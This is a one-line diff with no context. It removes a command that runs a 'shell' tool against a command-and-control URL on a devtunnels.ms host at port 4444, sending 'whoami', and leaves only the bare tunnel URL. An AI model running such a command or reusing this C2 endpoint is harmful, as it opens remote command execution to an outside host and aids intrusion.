@@ -1,1 +1,1 @@
-shell --c2 https://pz1rmkh7-4444.inc1.devtunnels.ms/ --cmd "whoami"
+https://pz1rmkh7-4444.inc1.devtunnels.ms/
